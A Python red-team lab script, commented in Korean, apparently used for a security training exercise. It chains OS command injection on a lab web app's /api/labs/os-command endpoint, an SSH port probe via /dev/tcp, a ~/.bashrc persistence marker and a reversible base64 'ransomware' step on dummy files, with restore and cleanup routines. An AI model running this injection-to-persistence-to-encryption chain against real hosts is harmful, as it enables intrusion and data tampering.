"""
OS 커맨드 인젝션 → 호스트 셸 → 지속성 → 호스트 랜섬(더미).

  1. T1190     OS 커맨드 인젝션(/api/labs/os-command)으로 호스트 셸 확보
  2. T1133     private subnet 이라 SSH 실제 불가 — :22 연결 시도로 Flow Log REJECT 유도
  3. T1505.003 crontab 이 없어 ~/.bashrc 에 주석 마커
  4. T1486     /opt/whs-lab-data/ 더미 파일만 변형, 가역

4단계가 가역이라 플래그 없이 실행한다. 대상은 인프라에서 미리 심어 둔 더미 파일이고,
공격 스크립트는 발견해서 변형만 한다(비어 있으면 중단). 변형은 base64 라 키 없이
되돌아가며, 원본은 .bak 으로 남기고 restore.sh 를 변형 전에 만들어 둔다.
impact.sh 는 /opt/whs-lab-data 외의 경로는 실행을 거부한다.

어느 호스트에서 무엇이 바뀌었는지는 recovery/ 에 남긴다. 시스템·앱 파일은 건드리지 않는다.

실행:
    python scenario3.py
    python scenario3.py --restore   # 4단계만 원상복구
"""

from __future__ import annotations

import argparse
import datetime as dt
import json
import sys
import uuid
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

import common
from common import WhsClient, banner

LOG = None

# 4. 실습 전용 더미 대상. impact.sh 가 /tmp 하위인지 다시 검증한다.
DUMMY_DIR = "/opt/whs-lab-data"


# ─────────────────────────────────────────────────────────────
# 1. OS 커맨드 인젝션 → 호스트 셸 (T1190)
# ─────────────────────────────────────────────────────────────
def step1_os_command(c: WhsClient) -> None:
    banner(LOG, "STEP 1 — OS 커맨드 인젝션(T1190): 호스트 셸 확보")
    for cmd in ("id", "hostname", "uname -sr", "pwd"):
        out = c.on_target(cmd, label=f"sh {cmd}")
        LOG.info("    sh %-10s → %s", cmd, out.replace("\n", " | "))
    LOG.info("  [+] /bin/sh 컨텍스트에서 임의 명령 실행 확인 (ec2-user, 대상 %s)",
             c.target_host)


# ─────────────────────────────────────────────────────────────
# 2. 노출 SSH 시도 (T1133) — private subnet 이라 연결 시도만
# ─────────────────────────────────────────────────────────────
def step2_ssh_probe(c: WhsClient) -> None:
    banner(LOG, "STEP 2 — 노출 SSH(T1133): private subnet — 연결 시도만")
    target = common.env("SSH_PROBE_TARGET", "127.0.0.1")
    out = c.on_target(
        f"timeout 3 bash -c '</dev/tcp/{target}/22 && echo SSH_OPEN' 2>&1 "
        "|| echo SSH_REJECT_OR_TIMEOUT", label="SSH 프로브").strip()
    LOG.info("  [+] %s:22 연결 시도 결과: %s", target, out.replace("\n", " "))
    LOG.info("      → 공인 IP 없어 실제 SSH 불가. VPC Flow Log 에 REJECT 증거만 남기는 흐름 유지")


# ─────────────────────────────────────────────────────────────
# 3. 지속성 심기 (T1505.003)
# ─────────────────────────────────────────────────────────────
def step3_persistence(c: WhsClient) -> None:
    """
    crontab 이 없어 셸 rc 파일에 주석 마커만 남긴다. 실제 페이로드는 아니다.

    명령이 os-command 200자 제한과 대상 가드 78자를 함께 통과해야 한다.
    마커가 두 번 들어가므로 32자를 넘기면 한도 초과로 중단된다(기본 26자).
    출력이 비면 이미 심겨 있다는 뜻이다. PRESENT 분기를 넣으면 한도를 넘는다.
    """
    banner(LOG, "STEP 3 — 지속성(T1505.003): 쓰기 가능 위치에 마커")
    marker = common.env("PERSIST_MARKER", "# whs-lab-scenario3-marker")
    cmd = (f"grep -qF '{marker}' ~/.bashrc"
           f"||{{ echo '{marker}'>>~/.bashrc;echo ADDED; }}")

    out = c.on_target(cmd, label="bashrc 마커")
    LOG.info("  [+] %s → ~/.bashrc %s", c.target_host,
             out.replace("\n", " ") or "PRESENT (이미 심겨 있음)")
    LOG.info("  [=] 대상 1대에 마커 확인 — 재로그인 시 로딩되는 위치 시연")

    common.save_recovery(
        HERE, "persistence_marker.json",
        json.dumps({"marker": marker, "file": "~/.bashrc",
                    "target_host": c.target_host,
                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                    # 구분자를 / 로 쓴다. 마커가 '#' 으로 시작해서 \# 를 구분자로 두면
                    # 정규식이 빈 문자열이 되어 sed 가 "no previous regular expression"
                    # 으로 실패한다(실제로 확인됨).
                    "cleanup": f"sed -i '/{marker}/d' ~/.bashrc"},
                   indent=2, ensure_ascii=False).encode())
    LOG.info("      정리 절차 기록: recovery/persistence_marker.json")


# ─────────────────────────────────────────────────────────────
# 4. 호스트 영향 단계 (T1486) — 더미만, 완전 가역
# ─────────────────────────────────────────────────────────────
def step4_host_impact(c: WhsClient) -> None:
    """
    호스트에 이미 있는 파일을 잠근다. 대상은 인프라 쪽에서 미리 심어 둔 것이고,
    공격 스크립트는 발견해서 변형만 한다. 비어 있으면 중단한다.
    """
    banner(LOG, "STEP 4 — T1486: 호스트 파일 변형 (시스템/앱 미접촉, 가역)")
    run_id = uuid.uuid4().hex[:12]

    # 멀티라인 스크립트라 업로드→실행 경로 사용 (os-command 200자 제한 회피)
    key = c.upload_payload("impact.sh", DUMMY_DIR=DUMMY_DIR, RUN_ID=run_id,
                           TARGET=c.short_host())
    LOG.info("  [+] impact.sh 업로드 key=%s (run_id=%s)", key, run_id)
    LOG.info("      대상=%s — base64 가역, 원본 .bak 보존, restore.sh 동시 생성", DUMMY_DIR)

    out = c.run_payload_on_target(key, label="파일 변형", expect="MANIFEST_BEGIN")
    if "REFUSED" in out:
        raise SystemExit(
            f"[!] 중단: impact.sh 가 대상 경로를 거부했다 ({c.target_host}): {out[:200]}")
    if "NO_TARGETS" in out:
        raise SystemExit(
            f"[!] 중단: {c.target_host} 의 {DUMMY_DIR} 에 잠글 파일이 없다.\n"
            f"    인프라(user_data / AMI)에서 더미 데이터를 심은 뒤 다시 실행할 것.")

    locked = [ln.split()[1] for ln in out.splitlines() if ln.startswith("LOCKED ")]
    LOG.info("  [+] %s — 변형 %d개: %s", c.target_host, len(locked),
             ", ".join(locked) or "(없음)")
    LOG.info("  [=] 대상 1대 처리 완료")
    LOG.info("      복구: python scenario3.py --restore (또는 호스트에서 sh %s/restore.sh)",
             DUMMY_DIR)

    common.save_recovery(
        HERE, "impact_manifest.json",
        json.dumps({"run_id": run_id, "dummy_dir": DUMMY_DIR, "s3_key": key,
                    "transform": "base64 (키 불필요 — 가역)",
                    "target_host": c.target_host,
                    "locked": locked,
                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                    "restore_on_host": f"sh {DUMMY_DIR}/restore.sh",
                    "originals": f"{DUMMY_DIR}/*.bak (원본 보존됨)"},
                   indent=2, ensure_ascii=False).encode())
    LOG.info("      복구 매니페스트: recovery/impact_manifest.json")


def step5_restore(c: WhsClient) -> None:
    """
    호스트에 남긴 흔적을 전부 되돌린다.
      4단계 변형 → restore.sh 실행 → 잔여물(.bak/restore.sh/NOTE.txt) 제거
      3단계 마커 → ~/.bashrc 에서 삭제

    잔여물 제거는 .locked 가 하나도 안 남았을 때만 한다. 복호가 덜 끝난 상태에서
    .bak 을 지우면 원본이 사라진다.
    """
    banner(LOG, "RESTORE — 호스트 흔적 원상복구")

    out = c.on_target(f"sh {DUMMY_DIR}/restore.sh 2>&1", label="restore.sh")
    LOG.info("  [+] 4단계 변형 복구 — %s", out.replace("\n", " | ") or "(출력 없음)")

    # 잔여물을 지우기 전에 .locked 가 남아 있는지 확인한다.
    # 남아 있으면 복호가 끝나지 않은 것이고, 이 상태에서 .bak 까지 지우면 원본이
    # 영구히 사라진다. restore.sh 가 없어진 채로 정리만 돌아 더미를 날린 적이 있다.
    probe = c.on_target(f"ls {DUMMY_DIR}/*.locked 2>/dev/null; echo END",
                        label=".locked 확인")
    still = [ln.strip() for ln in probe.splitlines() if ln.strip().endswith(".locked")]

    if still:
        LOG.error("  [!] 복호되지 않은 파일 %d개 — 잔여물을 지우지 않는다(.bak 보존).", len(still))
        for f in still:
            LOG.error("      %s", f)
        LOG.error("      원본은 .bak 에 있다. 호스트에서 직접 되돌릴 것:")
        LOG.error("      sh " + DUMMY_DIR + "/restore.sh")
        LOG.error("      (restore.sh 가 없으면)  cd " + DUMMY_DIR
                  + " && for f in *.bak; do mv \"$f\" \"${f%.bak}\"; done")
    else:
        left = c.on_target(
            f"cd {DUMMY_DIR} && rm -f *.bak restore.sh NOTE.txt; ls",
            label="잔여물 정리")
        LOG.info("  [+] 잔여물 제거 — 남은 파일: %s", left.replace("\n", " | ") or "(없음)")

    # 3단계 마커 제거. 기록이 없으면 기본 마커로 시도한다.
    path = HERE / "recovery" / "persistence_marker.json"
    marker = "# whs-lab-scenario3-marker"
    if path.exists():
        marker = json.loads(path.read_text(encoding="utf-8")).get("marker", marker)
    # 구분자는 '/' 를 쓴다. 마커가 '#' 으로 시작해서 \#…#d 형태는 빈 정규식이 된다.
    res = c.on_target(
        f"sed -i '/{marker}/d' ~/.bashrc; grep -cF '{marker}' ~/.bashrc || true",
        label="bashrc 마커 제거")
    LOG.info("  [+] 3단계 마커 제거 — 남은 개수: %s", res.strip() or "0")

    # 마커까지는 지우고 중단한다. 복구 기록을 남겨둬야 다음 실행이 막히고,
    # 사람이 .bak 을 확인하기 전에 자동 정리가 또 돌지 않는다.
    if still:
        raise SystemExit(
            "[!] 중단: 4단계 변형이 복구되지 않았다. 위 안내대로 호스트에서 되돌린 뒤\n"
            "    다시 python scenario3.py --restore 를 실행할 것.")

    LOG.info("  [=] %s 호스트 흔적 제거 완료", c.target_host)

    # 호스트를 되돌렸으니 호스트 쪽 미복구 표시를 먼저 지운다.
    # S3 정리와 묶어두면 UPLOAD_BUCKET 미설정 시 표시가 영영 안 지워져,
    # 호스트가 깨끗한데도 '변형된 채다' 로 다음 실행이 막힌다.
    common.clear_recovery(HERE, "impact_manifest.json")
    common.clear_recovery(HERE, "persistence_marker.json")

    # 4단계에서 올린 impact.sh 가 S3 에 남는다. 호스트가 아니라 S3 라
    # 공격 경로로는 못 지운다(s3:DeleteObject 없음) — 운영자 키로 지운다.
    bucket = common.env("UPLOAD_BUCKET")
    if not bucket:
        LOG.warning("  [!] UPLOAD_BUCKET 미설정 — S3 에 올린 impact.sh 가 남는다.")
        LOG.warning("      recovery/uploaded_objects.json 을 보고 수동으로 지울 것.")
        return
    banner(LOG, "RESTORE — S3 업로드 객체 삭제")
    common.delete_uploaded_objects(LOG, HERE, bucket)


# ─────────────────────────────────────────────────────────────
# main
# ─────────────────────────────────────────────────────────────
def pin_recorded_target(c: WhsClient) -> None:
    """
    공격 당시 기록해 둔 대상 호스트로 고정한다.

    복구 때 pin_target() 으로 새로 잡으면 ALB 가 다른 인스턴스를 줄 수 있어서
    '공격한 곳과 다른 데서 복구를 시도하는' 사고가 난다. 기록이 없으면 중단.
    """
    # 4단계까지 갔으면 impact_manifest, 3단계에서 멈췄으면 persistence_marker 에 남는다.
    for name in ("impact_manifest.json", "persistence_marker.json"):
        path = HERE / "recovery" / name
        if not path.exists():
            continue
        host = json.loads(path.read_text(encoding="utf-8")).get("target_host")
        if host:
            c.target_host = host
            LOG.info("[pin] 복구 대상 고정 — %s (%s 기록)", host, name)
            return
    raise SystemExit(
        f"[!] 중단: 복구 대상 기록이 없습니다 — {HERE / 'recovery'} 를 확인할 것")


def main():
    global LOG
    ap = argparse.ArgumentParser(
        description="scenario3 — OS 커맨드 인젝션 → 호스트 셸 → 지속성 → 더미 랜섬")
    ap.add_argument("--restore", action="store_true",
                    help="4 더미 변형만 원상복구하고 종료 (공격 당시 대상 호스트로 재연결)")
    args = ap.parse_args()

    common.load_env(HERE)
    LOG = common.get_logger(HERE, "scenario3")
    banner(LOG, "SCENARIO 3 — OS 커맨드 인젝션 → 호스트 셸 → 지속성 → 더미 랜섬",
           "흐름도3 (WHS 실습) — 단일 인스턴스 대상")

    c = WhsClient(common.env("WEBAPP_URL", "https://whs4namu.click"), LOG,
                  recovery_dir=HERE)

    c.login_normal(common.need_env("WHS_LOGIN_EMAIL"),
                   common.need_env("WHS_LOGIN_PASSWORD"))

    if args.restore:
        pin_recorded_target(c)
        step5_restore(c)
        banner(LOG, "SCENARIO 3 복구 종료", "로그: scenario3/scenario3.log")
        return

    # 되돌리지 않은 호스트 흔적이 있으면 막는다. 그대로 또 돌리면 ALB 가 다른
    # 인스턴스를 줄 수 있고, 그러면 기록된 target_host 가 덮어써져 먼저 심은
    # 쪽을 --restore 로 못 찾는다.
    common.require_restored(
        LOG, HERE, "python scenario3.py --restore",
        [("impact_manifest.json", None, "호스트 파일이 변형된 채다"),
         ("persistence_marker.json", None, "~/.bashrc 마커가 남아 있다"),
         ("uploaded_objects.json", "keys", "S3 에 impact.sh 가 남아 있다")])

    # 인스턴스 1대를 고정하고 1~4 전부 그 한 대에서만 실행한다.
    c.pin_target()

    step1_os_command(c)
    step2_ssh_probe(c)
    step3_persistence(c)
    step4_host_impact(c)

    banner(LOG, "SCENARIO 3 종료", "로그: scenario3/scenario3.log")

    LOG.warning("")
    LOG.warning("[원상복구]  python scenario3.py --restore")
    LOG.warning("  %s 의 변형 파일·잔여물, ~/.bashrc 마커,", c.target_host)
    LOG.warning("  S3 에 올린 impact.sh 를 한 번에 되돌린다.")


if __name__ == "__main__":
    main()
